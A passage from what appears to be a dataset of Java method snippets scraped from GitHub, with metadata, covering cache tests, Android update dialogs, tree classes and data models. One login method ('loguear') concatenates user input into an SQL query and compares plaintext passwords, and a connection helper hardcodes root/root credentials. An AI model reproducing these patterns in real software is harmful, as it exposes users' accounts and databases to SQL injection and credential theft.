id.equals(that.id);    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/properties/ThemeProperty.java", "stars": "1", "class": {"name": "ThemeProperty", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {        return Objects.hash(id);    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/properties/ThemeProperty.java", "stars": "1", "class": {"name": "ThemeProperty", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "shouldDemonstrateHowAllObjectsAreFlushedAfterBasedOnTime", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrateHowAllObjectsAreFlushedAfterBasedOnTime() throws Exception {    Cache cache = new PerpetualCache(\"DefaultCache\");    cache = new ScheduledCache(cache);    ((ScheduledCache) cache).setClearInterval(2500);    cache = new LoggingCache(cache);    for (int i = 0; i < 100; i++) {      cache.putObject(i, i);      assertEquals(i, cache.getObject(i));    }    Thread.sleep(5000);    assertEquals(0, cache.getSize());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/ScheduledCacheTest.java", "stars": "15", "class": {"name": "ScheduledCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldRemoveItemOnDemand", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldRemoveItemOnDemand() {    Cache cache = new PerpetualCache(\"DefaultCache\");    cache = new ScheduledCache(cache);    ((ScheduledCache) cache).setClearInterval(60000);    cache = new LoggingCache(cache);    cache.putObject(0, 0);    assertNotNull(cache.getObject(0));    cache.removeObject(0);    assertNull(cache.getObject(0));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/ScheduledCacheTest.java", "stars": "15", "class": {"name": "ScheduledCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldFlushAllItemsOnDemand", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFlushAllItemsOnDemand() {    Cache cache = new PerpetualCache(\"DefaultCache\");    cache = new ScheduledCache(cache);    ((ScheduledCache) cache).setClearInterval(60000);    cache = new LoggingCache(cache);    for (int i = 0; i < 5; i++) {      cache.putObject(i, i);    }    assertNotNull(cache.getObject(0));    assertNotNull(cache.getObject(4));    cache.clear();    assertNull(cache.getObject(0));    assertNull(cache.getObject(4));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/ScheduledCacheTest.java", "stars": "15", "class": {"name": "ScheduledCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setType", "params": ["Type"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setType(Type type) {            mType = type;            switch (type) {                case FINISH:                    mIconView.setImageResource(R.drawable.ic_dialog_finish);                    break;                case ERROR:                    mIconView.setImageResource(R.drawable.ic_dialog_error);                    break;                case WARN:                    mIconView.setImageResource(R.drawable.ic_dialog_warning);                    break;                default:                    break;            }            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "setDuration", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setDuration(int duration) {            mDuration = duration;            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "setMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setMessage(@StringRes int id) {            return setMessage(getString(id));        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "setMessage", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setMessage(CharSequence text) {            mMessageView.setText(text);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "create", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BaseDialog", "snippet": "        public BaseDialog create() {            // \u5982\u679c\u663e\u793a\u7684\u7c7b\u578b\u4e3a\u7a7a\u5c31\u629b\u51fa\u5f02\u5e38            if (mType == null) {                throw new IllegalArgumentException(\"The display type must be specified\");            }            // \u5982\u679c\u5185\u5bb9\u4e3a\u7a7a\u5c31\u629b\u51fa\u5f02\u5e38            if (\"\".equals(mMessageView.getText().toString())) {                throw new IllegalArgumentException(\"Dialog message not null\");            }            return super.create();        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "onShow", "params": ["BaseDialog"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onShow(BaseDialog dialog) {            // \u5ef6\u8fdf\u81ea\u52a8\u5173\u95ed            postDelayed(this, mDuration);        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void run() {            if (isShowing()) {                dismiss();            }        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/ToastDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["Runnable", "BaseDialog"], "modifiers": ["public", "final", "static"]}}, {"method_name": "setVersionName", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setVersionName(CharSequence name) {            mNameView.setText(name);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setUpdateLog", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setUpdateLog(CharSequence text) {            mContentView.setText(text);            mContentView.setVisibility(text == null ? View.GONE : View.VISIBLE);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setForceUpdate", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setForceUpdate(boolean force) {            mCloseView.setVisibility(force ? View.GONE : View.VISIBLE);            setCancelable(!force);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setDownloadUrl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setDownloadUrl(String url) {            mDownloadUrl = url;            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setFileMD5", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setFileMD5(String md5) {            mFileMD5 = md5;            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View v) {            if (v == mCloseView) {                dismiss();            } else if (v == mUpdateView) {                // \u5224\u65ad\u4e0b\u8f7d\u72b6\u6001                if (mDownloadComplete) {                    // \u4e0b\u8f7d\u5b8c\u6bd5\uff0c\u5b89\u88c5 Apk                    installApk();                } else if (!mDownloading) {                    // \u6ca1\u6709\u4e0b\u8f7d\uff0c\u5f00\u542f\u4e0b\u8f7d                    downloadApk();                }            }        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "downloadApk", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void downloadApk() {            // \u521b\u5efa\u8981\u4e0b\u8f7d\u7684\u6587\u4ef6\u5bf9\u8c61            mApkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), getString(R.string.app_name) + \"_v\" + mNameView.getText().toString() + \".apk\");            // \u8bbe\u7f6e\u5bf9\u8bdd\u6846\u4e0d\u80fd\u88ab\u53d6\u6d88            setCancelable(false);            EasyHttp.download(getActivity())                    .method(HttpMethod.GET)                    .file(mApkFile)                    .url(mDownloadUrl)                    .md5(mFileMD5)                    .listener(new OnDownloadListener() {                        @Override                        public void onStart(Call call) {                            // \u6807\u8bb0\u4e3a\u4e0b\u8f7d\u4e2d                            mDownloading = true;                            // \u6807\u8bb0\u6210\u672a\u4e0b\u8f7d\u5b8c\u6210                            mDownloadComplete = false;                            // \u540e\u53f0\u66f4\u65b0                            mCloseView.setText(R.string.update_background);                            // \u663e\u793a\u8fdb\u5ea6\u6761                            mProgressView.setVisibility(View.VISIBLE);                        }                        @Override                        public void onProgress(DownloadInfo info) {                            mUpdateView.setText(String.format(getString(R.string.update_status_running), info.getDownloadProgress()));                            mProgressView.setProgress(info.getDownloadProgress());                        }                        @Override                        public void onComplete(DownloadInfo info) {                            mCloseView.setText(R.string.update_no);                            mUpdateView.setText(R.string.update_status_successful);                            // \u6807\u8bb0\u6210\u4e0b\u8f7d\u5b8c\u6210                            mDownloadComplete = true;                            // \u5b89\u88c5 Apk                            installApk();                        }                        @SuppressWarnings(\"ResultOfMethodCallIgnored\")                        @Override                        public void onError(DownloadInfo info, Exception e) {                            mUpdateView.setText(R.string.update_status_failed);                            // \u5220\u9664\u4e0b\u8f7d\u7684\u6587\u4ef6                            info.getFile().delete();                        }                        @Override                        public void onEnd(Call call) {                            // \u9690\u85cf\u8fdb\u5ea6\u6761                            mProgressView.setVisibility(View.GONE);                            // \u6807\u8bb0\u5f53\u524d\u4e0d\u662f\u4e0b\u8f7d                            mDownloading = false;                        }                    }).start();        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "installApk", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void installApk() {            Intent intent = new Intent();            intent.setAction(Intent.ACTION_VIEW);            Uri uri;            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {                uri = FileProvider.getUriForFile(getContext(), AppConfig.getPackageName() + \".provider\", mApkFile);                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);            } else {                uri = Uri.fromFile(mApkFile);            }            intent.setDataAndType(uri, \"application/vnd.android.package-archive\");            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);            getContext().startActivity(intent);        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/UpdateDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "initDatabase", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "    static void initDatabase() throws Exception {        try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/lazyload_common_property/ibatisConfig.xml\")) {            sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);        }        BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),                \"org/apache/ibatis/submitted/lazyload_common_property/CreateDB.sql\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/CommonPropertyLazyLoadTest.java", "stars": "15", "class": {"name": "CommonPropertyLazyLoadTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testLazyLoadWithNoAncestor", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testLazyLoadWithNoAncestor() {        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {            ChildMapper childMapper = sqlSession.getMapper(ChildMapper.class);            childMapper.selectById(1);        }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/CommonPropertyLazyLoadTest.java", "stars": "15", "class": {"name": "CommonPropertyLazyLoadTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testLazyLoadWithFirstAncestor", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testLazyLoadWithFirstAncestor() {        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {            FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);            ChildMapper childMapper = sqlSession.getMapper(ChildMapper.class);            fatherMapper.selectById(1);            childMapper.selectById(1);        }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/CommonPropertyLazyLoadTest.java", "stars": "15", "class": {"name": "CommonPropertyLazyLoadTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testLazyLoadWithAllAncestors", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testLazyLoadWithAllAncestors() {        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {            GrandFatherMapper grandFatherMapper = sqlSession.getMapper(GrandFatherMapper.class);            FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);            ChildMapper childMapper = sqlSession.getMapper(ChildMapper.class);            grandFatherMapper.selectById(1);            fatherMapper.selectById(1);            childMapper.selectById(1);        }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/CommonPropertyLazyLoadTest.java", "stars": "15", "class": {"name": "CommonPropertyLazyLoadTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testLazyLoadSkipFirstAncestor", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testLazyLoadSkipFirstAncestor() {        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {            GrandFatherMapper grandFatherMapper = sqlSession.getMapper(GrandFatherMapper.class);            ChildMapper childMapper = sqlSession.getMapper(ChildMapper.class);            grandFatherMapper.selectById(1);            childMapper.selectById(1);        }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_common_property/CommonPropertyLazyLoadTest.java", "stars": "15", "class": {"name": "CommonPropertyLazyLoadTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getRoot", "params": [], "throws": null, "modifiers": ["public"], "return_type": "NTreeNode<T>", "snippet": "    public NTreeNode<T> getRoot() {        return root;    }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/NTree.java", "stars": "1", "class": {"name": "NTree", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isEmpty", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEmpty(){       return this.root==null;    }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/NTree.java", "stars": "1", "class": {"name": "NTree", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "add", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean add(T info){      this.root = new NTreeNode<>(info);      return true;    }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/NTree.java", "stars": "1", "class": {"name": "NTree", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "add", "params": ["T", "T"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean add(T info, T parent){        NTreeNode<T> auxParent = search(parent);        if (auxParent!=null) {            auxParent.childs.insert(new NTreeNode<>(info));            return true;        }        else {             return false;        }    }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/NTree.java", "stars": "1", "class": {"name": "NTree", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "search", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "NTreeNode<T>", "snippet": "    public NTreeNode<T> search(T info){      return search(root, info);      }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/NTree.java", "stars": "1", "class": {"name": "NTree", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "search", "params": ["NTreeNode<T>", "T"], "throws": null, "modifiers": ["private"], "return_type": "NTreeNode<T>", "snippet": "    private NTreeNode <T> search(NTreeNode<T> auxRoot, T info){       if (comparator.compare(auxRoot.info,info)!=0) {           SimpleNode <NTreeNode<T>> aux = auxRoot.childs.getHead();           while(aux!=null) {             NTreeNode<T> tmp = search(aux.getInfo(),info);             if (tmp!=null) {                return  tmp;             }             aux = aux.getNext();           }           return null;       }       else {          return auxRoot;       }    }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/NTree.java", "stars": "1", "class": {"name": "NTree", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getId() {        return id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Tag.java", "stars": "1", "class": {"name": "Tag", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Long id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Tag.java", "stars": "1", "class": {"name": "Tag", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Tag.java", "stars": "1", "class": {"name": "Tag", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Tag.java", "stars": "1", "class": {"name": "Tag", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_transactions);    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/transactions.java", "stars": "2", "class": {"name": "transactions", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ProjectsManagerAdapter", "snippet": "    public ProjectsManagerAdapter.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {        View view = inflater.inflate(R.layout.projects_manager_item_project, parent, false);        return new ProjectsManagerAdapter.ViewHolder(view);    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/ProjectsManagerAdapter.java", "stars": "4", "class": {"name": "ProjectsManagerAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBindViewHolder", "params": ["ProjectsManagerAdapter", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NotNull ProjectsManagerAdapter.ViewHolder holder, int position) {        if(loadingDialog == null)            loadingDialog = new LoadingDialog(activity);        holder.title.setText(data.get(position).getProjectName());        holder.subtitle.setText(data.get(position).getProjectPackage().concat(\" (\").concat(String.valueOf(data.get(position).getId())).concat(\")\"));        GlideUtil.set(new File(data.get(position).getIconPath()), holder.icon, activity);        holder.itemView.setOnClickListener(v -> holder.menu.performClick());        holder.menu.setOnClickListener(v -> {            new AppBottomDialog.Builder(activity)                    .setTitle(R.string.title_menu)                    .setTheme(AppBottomDialogUtil.getThemeSettings(activity))                    .setupMenu(R.menu.projectsmanager_menu)                    .setListener(menuItem -> {                        switch (menuItem.getItemId()) {                            case R.id.backupProject:                                loadingDialog.show();                                new ThreadLoader(() -> {                                    projectUtil.backupProject(data.get(position).getId());                                }, () -> {                                    Toast.makeText(activity, activity.getString(R.string.title_backuped), Toast.LENGTH_SHORT).show();                                    MyProjectsAdapter.onProjectsUpdated.onUpdate();                                    loadingDialog.dismiss();                                });                                break;                        }                    })                    .build()                    .show();        });    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/ProjectsManagerAdapter.java", "stars": "4", "class": {"name": "ProjectsManagerAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {        return data.size();    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/ProjectsManagerAdapter.java", "stars": "4", "class": {"name": "ProjectsManagerAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Connection", "snippet": "    public static Connection getConnection(){        //cambiar nombre de la bd        String url=\"jdbc:mysql://localhost:3306/fae1\";        String userName=\"root\";        String password=\"root\";                Connection con = null;                try{            Class.forName(\"com.mysql.jdbc.Driver\");            con = DriverManager.getConnection(url, userName, password);        }catch(ClassNotFoundException | SQLException e){            System.out.println(e.getMessage());            System.out.println(Arrays.toString(e.getStackTrace()));        }        return con;    }", "url": "https://raw.githubusercontent.com/portocreator/FAEv1.0/master/src/java/modelado/Operaciones.java", "stars": "2", "class": {"name": "Operaciones", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "loguear", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int loguear(String usuario, String password){        int nivel = 0;        try{            Connection con = Operaciones.getConnection();            ResultSet rs;            //verificar nombre de las columnas            String q = \"SELECT user_level FROM musuario where user_tag='\"+usuario+\"' and user_password='\"+password+\"'\";             PreparedStatement ps = con.prepareStatement(q);             rs = ps.executeQuery();                        while(rs.next()){                nivel = rs.getInt(1);            }            con.close();        }catch(SQLException ed){            System.out.println(ed.getMessage());            System.out.println(Arrays.toString(ed.getStackTrace()));        }        return nivel;    }", "url": "https://raw.githubusercontent.com/portocreator/FAEv1.0/master/src/java/modelado/Operaciones.java", "stars": "2", "class": {"name": "Operaciones", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPersonID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPersonID() {\t\treturn personID;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/PersonTitleLink.java", "stars": "1", "class": {"name": "PersonTitleLink", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTitleID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getTitleID() {\t\treturn titleID;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/PersonTitleLink.java", "stars": "1", "class": {"name": "PersonTitleLink", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getYear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getYear() {\t\treturn year;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/PersonTitleLink.java", "stars": "1", "class": {"name": "PersonTitleLink", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResourceAsURL", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "URL", "snippet": "  public URL getResourceAsURL(String resource) {    return getResourceAsURL(resource, getClassLoaders(null));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResourceAsURL", "params": ["String", "ClassLoader"], "throws": null, "modifiers": ["public"], "return_type": "URL", "snippet": "  public URL getResourceAsURL(String resource, ClassLoader classLoader) {    return getResourceAsURL(resource, getClassLoaders(classLoader));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResourceAsStream", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "InputStream", "snippet": "  public InputStream getResourceAsStream(String resource) {    return getResourceAsStream(resource, getClassLoaders(null));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResourceAsStream", "params": ["String", "ClassLoader"], "throws": null, "modifiers": ["public"], "return_type": "InputStream", "snippet": "  public InputStream getResourceAsStream(String resource, ClassLoader classLoader) {    return getResourceAsStream(resource, getClassLoaders(classLoader));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "classForName", "params": ["String"], "throws": ["ClassNotFoundException"], "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> classForName(String name) throws ClassNotFoundException {    return classForName(name, getClassLoaders(null));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "classForName", "params": ["String", "ClassLoader"], "throws": ["ClassNotFoundException"], "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> classForName(String name, ClassLoader classLoader) throws ClassNotFoundException {    return classForName(name, getClassLoaders(classLoader));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResourceAsStream", "params": ["String", "ClassLoader"], "throws": null, "modifiers": [], "return_type": "InputStream", "snippet": "  InputStream getResourceAsStream(String resource, ClassLoader[] classLoader) {    for (ClassLoader cl : classLoader) {      if (null != cl) {        // try to find the resource as passed        InputStream returnValue = cl.getResourceAsStream(resource);        // now, some class loaders want this leading \"/\", so we'll add it and try again if we didn't find the resource        if (null == returnValue) {          returnValue = cl.getResourceAsStream(\"/\" + resource);        }        if (null != returnValue) {          return returnValue;        }      }    }    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResourceAsURL", "params": ["String", "ClassLoader"], "throws": null, "modifiers": [], "return_type": "URL", "snippet": "  URL getResourceAsURL(String resource, ClassLoader[] classLoader) {    